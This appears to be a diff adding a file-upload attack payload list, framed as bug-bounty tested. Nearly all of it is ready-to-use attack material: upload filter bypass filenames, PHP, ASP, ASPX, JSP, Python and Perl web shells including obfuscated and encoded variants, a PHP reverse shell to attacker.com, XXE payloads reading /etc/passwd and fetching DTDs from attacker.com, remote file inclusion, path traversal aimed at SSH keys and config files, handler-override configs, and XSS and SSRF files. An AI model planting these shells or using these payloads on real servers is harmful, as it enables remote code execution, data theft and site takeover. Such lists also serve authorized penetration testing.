@@ -1,0 +1,648 @@
+# File Upload Vulnerability Payloads (2020-2025 Bug Bounty Tested)
+
+# ============================
+# FILE EXTENSION BYPASSES
+# ============================
+
+# Double Extensions
+shell.php.jpg
+shell.php.png
+shell.php.gif
+shell.php.pdf
+shell.php.txt
+shell.jpg.php
+shell.png.php
+exploit.asp.jpg
+exploit.aspx.png
+backdoor.jsp.gif
+
+# Case Variations
+shell.PHP
+shell.PhP
+shell.pHp
+shell.Php
+shell.PHp
+shell.ASP
+shell.ASPX
+shell.AsP
+shell.JSP
+
+# Null Byte Injection (older systems)
+shell.php%00.jpg
+shell.php%00.png
+shell.php\x00.jpg
+shell.asp%00.gif
+exploit.jsp%00.pdf
+
+# Special Characters
+shell.php.....
+shell.php%20
+shell.php%0a
+shell.php%00
+shell.php%0d%0a
+shell.php::$DATA
+shell.php::$INDEX_ALLOCATION
+
+# Alternate Extensions (PHP)
+shell.php3
+shell.php4
+shell.php5
+shell.php7
+shell.phtml
+shell.phar
+shell.phpt
+shell.pgif
+shell.pht
+shell.inc
+shell.hphp
+shell.ctp
+
+# Alternate Extensions (ASP/ASPX)
+shell.asp
+shell.aspx
+shell.asa
+shell.asax
+shell.ascx
+shell.ashx
+shell.asmx
+shell.cer
+shell.config
+shell.soap
+shell.rem
+
+# Alternate Extensions (JSP)
+shell.jsp
+shell.jspx
+shell.jsw
+shell.jsv
+shell.jspf
+
+# Other Language Extensions
+shell.pl
+shell.pm
+shell.cgi
+shell.py
+shell.pyc
+shell.rb
+shell.rbw
+shell.sh
+shell.bash
+
+# Executable Extensions
+malware.exe
+backdoor.bat
+script.cmd
+payload.ps1
+reverse.sh
+
+# Server Config Files
+.htaccess
+.htpasswd
+web.config
+httpd.conf
+.user.ini
+php.ini
+
+# ============================
+# CONTENT-TYPE BYPASSES
+# ============================
+
+# Common Content-Type Headers to Test:
+
+# Legitimate looking but with malicious content
+Content-Type: image/jpeg
+Content-Type: image/png
+Content-Type: image/gif
+Content-Type: image/bmp
+Content-Type: image/svg+xml
+Content-Type: application/pdf
+Content-Type: application/zip
+Content-Type: text/plain
+Content-Type: text/csv
+Content-Type: application/octet-stream
+Content-Type: video/mp4
+Content-Type: audio/mpeg
+
+# Empty or null
+Content-Type: 
+Content-Type: null
+Content-Type: undefined
+
+# Malformed
+Content-Type: image/jpeg; charset=binary
+Content-Type: multipart/form-data; boundary=something
+
+# ============================
+# MAGIC BYTES (File Signatures)
+# ============================
+
+# PHP Web Shell with JPEG Header
+FF D8 FF E0 (JPEG magic bytes)
+<?php system($_GET['cmd']); ?>
+
+# PHP Web Shell with PNG Header
+89 50 4E 47 0D 0A 1A 0A (PNG magic bytes)
+<?php system($_GET['cmd']); ?>
+
+# PHP Web Shell with GIF Header
+GIF89a
+<?php system($_GET['cmd']); ?>
+
+# PHP Web Shell with PDF Header
+%PDF-1.4
+<?php system($_GET['cmd']); ?>
+
+# PHP Web Shell with ZIP Header
+PK (ZIP magic bytes)
+<?php system($_GET['cmd']); ?>
+
+# ============================
+# POLYGLOT FILES (Valid Image + Valid Code)
+# ============================
+
+# GIF + PHP Polyglot
+GIF89a<?php system($_GET['cmd']); ?>
+
+# JPEG + PHP Polyglot (with comment)
+# Add PHP code in JPEG comment section
+# Use exiftool: exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
+
+# PNG + PHP Polyglot
+# Use PNG ancillary chunks to hide PHP code
+
+# BMP + PHP Polyglot
+# BMP header followed by PHP code in pixel data
+
+# ============================
+# WEB SHELL PAYLOADS
+# ============================
+
+# === PHP Web Shells ===
+
+# Simple PHP Shell
+<?php system($_GET['cmd']); ?>
+
+# PHP Shell with POST
+<?php system($_POST['cmd']); ?>
+
+# PHP Eval Shell
+<?php eval($_REQUEST['cmd']); ?>
+
+# PHP Passthru Shell
+<?php passthru($_GET['cmd']); ?>
+
+# PHP Exec Shell
+<?php echo exec($_GET['cmd']); ?>
+
+# PHP Shell_exec
+<?php echo shell_exec($_GET['cmd']); ?>
+
+# PHP Backdoor
+<?php
+if(isset($_REQUEST['cmd'])){
+    echo "<pre>";
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+    echo "</pre>";
+    die;
+}
+?>
+
+# PHP File Manager Shell
+<?php
+if(isset($_GET['file'])){
+    echo file_get_contents($_GET['file']);
+}
+if(isset($_FILES['upload'])){
+    move_uploaded_file($_FILES['upload']['tmp_name'], $_FILES['upload']['name']);
+}
+?>
+
+# PHP One-liner Shells
+<?=`$_GET[x]`?>
+<?=system($_GET[x]);?>
+<?=shell_exec($_GET[x]);?>
+<?=passthru($_GET[x]);?>
+<?=exec($_GET[x]);?>
+
+# Obfuscated PHP Shell
+<?php $a=$_GET['a'];$b=$_GET['b'];$a($b);?>
+<?php @eval($_POST['x']);?>
+<?php @assert($_POST['x']);?>
+<?php $f='sys'.'tem';$f($_GET['x']);?>
+
+# PHP Reverse Shell
+<?php
+$sock=fsockopen("attacker.com",4444);
+exec("/bin/sh -i <&3 >&3 2>&3");
+?>
+
+# === ASP/ASPX Web Shells ===
+
+# ASP Shell
+<%
+Set oScript = Server.CreateObject("WSCRIPT.SHELL")
+Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
+Response.Write(oScript.Exec("cmd /c " & Request.QueryString("cmd")).StdOut.ReadAll())
+%>
+
+# ASPX Shell
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<script runat="server">
+void Page_Load(object sender, EventArgs e){
+    Process p = new Process();
+    p.StartInfo.FileName = "cmd.exe";
+    p.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
+    p.StartInfo.RedirectStandardOutput = true;
+    p.StartInfo.UseShellExecute = false;
+    p.Start();
+    Response.Write(p.StandardOutput.ReadToEnd());
+}
+</script>
+
+# ASPX One-liner
+<%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>
+
+# === JSP Web Shells ===
+
+# JSP Shell
+<%@ page import="java.io.*" %>
+<%
+String cmd = request.getParameter("cmd");
+Process p = Runtime.getRuntime().exec(cmd);
+InputStream in = p.getInputStream();
+int i;
+while((i = in.read()) != -1) {
+    out.print((char)i);
+}
+%>
+
+# JSP One-liner
+<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
+
+# === Python Web Shell ===
+
+#!/usr/bin/env python
+import os
+import cgi
+form = cgi.FieldStorage()
+cmd = form.getvalue('cmd')
+os.system(cmd)
+
+# === Perl Web Shell ===
+
+#!/usr/bin/perl
+use CGI;
+$q = CGI->new;
+print $q->header;
+print `$q->param('cmd')`;
+
+# ============================
+# XSS VIA FILE UPLOAD
+# ============================
+
+# HTML File Upload
+<html>
+<body>
+<script>alert(document.cookie)</script>
+</body>
+</html>
+
+# SVG File Upload with XSS
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+      alert(document.domain);
+   </script>
+</svg>
+
+# SVG with XSS (onload)
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
+
+# PDF with XSS (if rendered in browser)
+%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Outlines 2 0 R
+/Pages 3 0 R
+/OpenAction << /S /JavaScript /JS (app.alert('XSS');) >>
+>>
+endobj
+
+# XML with XSS
+<?xml version="1.0"?>
+<!DOCTYPE html [
+<!ENTITY js "alert(document.domain)">
+]>
+<html>
+<body>
+<script>&js;</script>
+</body>
+</html>
+
+# ============================
+# XXE VIA FILE UPLOAD
+# ============================
+
+# SVG with XXE
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+   <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+
+# XML with XXE
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<foo>&xxe;</foo>
+
+# XXE - Parameter Entity
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+%xxe;
+]>
+<foo>&exfil;</foo>
+
+# XXE - Blind OOB
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "http://attacker.com/xxe.dtd">
+%sp;
+%param1;
+]>
+<r>&exfil;</r>
+
+# ============================
+# PATH TRAVERSAL IN FILENAME
+# ============================
+
+# Directory Traversal
+../../../etc/passwd
+..\..\..\..\windows\system32\config\sam
+....//....//....//etc/passwd
+
+# Overwrite Important Files
+../../../var/www/html/index.php
+../../../.ssh/authorized_keys
+../../config.php
+../../../.htaccess
+../../wp-config.php
+
+# Filename with Path Traversal
+../../../../tmp/shell.php
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+
+# ============================
+# HTACCESS FILE UPLOAD
+# ============================
+
+# .htaccess to Execute PHP
+AddType application/x-httpd-php .jpg
+AddType application/x-httpd-php .png
+AddType application/x-httpd-php .gif
+
+# .htaccess to Execute All Files as PHP
+AddType application/x-httpd-php .
+SetHandler application/x-httpd-php
+
+# .htaccess to Bypass Upload Restrictions
+<FilesMatch "\.ph(p|tml)">
+SetHandler application/x-httpd-php
+</FilesMatch>
+
+# ============================
+# WEB.CONFIG FILE UPLOAD (IIS)
+# ============================
+
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+   <system.webServer>
+      <handlers>
+         <add name="PHP_via_FastCGI" 
+              path="*.jpg" 
+              verb="*" 
+              modules="FastCgiModule" 
+              scriptProcessor="C:\PHP\php-cgi.exe" 
+              resourceType="Unspecified" />
+      </handlers>
+   </system.webServer>
+</configuration>
+
+# ============================
+# ARCHIVE-BASED ATTACKS
+# ============================
+
+# ZIP Slip - Malicious Archive
+# Create zip file with: ../../../../var/www/html/shell.php
+
+# ZIP with Symlink
+# ln -s /etc/passwd passwd.txt
+# zip --symlinks payload.zip passwd.txt
+
+# TAR with Path Traversal
+# tar -cf payload.tar ../../../../var/www/html/shell.php
+
+# Zip Bomb (DoS)
+# Create highly compressed file that expands to huge size
+
+# ============================
+# IMAGE METADATA INJECTION
+# ============================
+
+# EXIF Data with XSS (if displayed)
+exiftool -Comment='<script>alert(1)</script>' image.jpg
+
+# EXIF Data with PHP Code
+exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
+
+# IPTC Data Injection
+exiftool -IPTC:Caption-Abstract='<?php eval($_POST["x"]); ?>' image.jpg
+
+# ============================
+# SERVER-SPECIFIC BYPASSES
+# ============================
+
+# Apache
+shell.php.jpg (with .htaccess: AddType application/x-httpd-php .jpg)
+.htaccess file to execute images as PHP
+
+# IIS
+shell.asp;.jpg
+shell.asp:.jpg
+web.config to execute images as ASP
+
+# Nginx
+shell.php%00.jpg (older versions)
+Upload to misconfigured alias/location
+
+# Tomcat
+shell.jsp%00.jpg
+shell.jspx
+
+# ============================
+# RACE CONDITION FILE UPLOAD
+# ============================
+
+# Upload file quickly and access before validation/deletion
+# Technique: Concurrent upload and access requests
+
+# ============================
+# FILE UPLOAD WITH SIZE BYPASS
+# ============================
+
+# Small malicious file
+<?=`$_GET[0]`?>
+
+# Compressed PHP shell
+<?=`{$_GET[0]}`;
+
+# ============================
+# MIME TYPE CONFUSION
+# ============================
+
+# Upload with different MIME types
+Content-Type: application/x-php
+Content-Type: application/x-httpd-php
+Content-Type: application/php
+Content-Type: text/php
+Content-Type: text/x-php
+
+# ============================
+# POLYGLOT FILES FOR MULTIPLE FORMATS
+# ============================
+
+# JPEG + JAR Polyglot (for Java apps)
+# Valid JPEG and valid JAR simultaneously
+
+# PDF + HTML Polyglot
+%PDF-1.4
+<html><script>alert(1)</script></html>
+
+# GIF + JavaScript
+GIF89a/*<?php
+<script>alert(1)</script>
+<?php */;
+
+# ============================
+# MODERN BYPASS TECHNIQUES (2023-2025)
+# ============================
+
+# Unicode Normalization
+shell.php%E2%80%AE.jpg (Right-to-Left Override)
+shell‮gpj.php (RLO character)
+
+# Homoglyph Attacks
+shell.рhр (Cyrillic р instead of Latin p)
+shell.рhр
+
+# UTF-8 BOM
+﻿<?php system($_GET['cmd']); ?>
+
+# Long Filename DoS
+# Create extremely long filename to bypass validation
+
+# Multiple Content-Disposition
+Content-Disposition: form-data; name="file"; filename="safe.jpg"
+Content-Disposition: form-data; name="file"; filename="shell.php"
+
+# Null Session (Windows)
+\\127.0.0.1\c$\inetpub\wwwroot\shell.php
+
+# Case Sensitivity Issues
+ShElL.PhP
+SHELL.php
+Shell.PHP
+
+# ============================
+# FRAMEWORK-SPECIFIC BYPASSES
+# ============================
+
+# WordPress
+wp-content/uploads/shell.php
+wp-content/themes/shell.php
+wp-content/plugins/shell.php
+
+# Drupal
+sites/default/files/shell.php
+
+# Joomla
+media/shell.php
+images/shell.php
+
+# Laravel
+storage/app/shell.php
+public/uploads/shell.php
+
+# Django
+media/uploads/shell.py
+
+# ============================
+# REMOTE FILE INCLUSION VIA UPLOAD
+# ============================
+
+# Upload file containing:
+<?php include($_GET['file']); ?>
+<?php require($_GET['file']); ?>
+<?php include_once($_GET['file']); ?>
+
+# Then access with:
+?file=http://attacker.com/shell.txt
+?file=php://input (with POST data containing PHP code)
+?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+
+# ============================
+# FILE UPLOAD WITH SSRF
+# ============================
+
+# Upload file that triggers SSRF
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<image xlink:href="http://internal-server/admin"/>
+</svg>
+
+# ============================
+# DESERIALIZATION VIA FILE UPLOAD
+# ============================
+
+# PHP Phar Deserialization
+# Upload malicious .phar file
+# Trigger via: file_get_contents('phar://uploads/payload.phar/test.txt')
+
+# Java Deserialization
+# Upload serialized Java object
+# Trigger if application deserializes uploaded files
+
+# ============================
+# EICAR TEST FILE (AV Bypass Testing)
+# ============================
+
+X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+
+# ============================
+# BINARY PAYLOAD ENCODINGS
+# ============================
+
+# Base64 Encoded Shell
+<?php eval(base64_decode("c3lzdGVtKCRfR0VUWydjbWQnXSk7")); ?>
+
+# Hex Encoded
+<?php eval(hex2bin("73797374656d28245f4745545b27636d64275d293b")); ?>
+
+# ROT13
+<?php eval(str_rot13("flfgrz($_TRG['pzq']);")); ?>
+
+# ============================
+# ALTERNATIVE DATA STREAMS (Windows/NTFS)
+# ============================
+
+shell.php::$DATA
+shell.asp::$DATA
+payload.txt:hidden.php
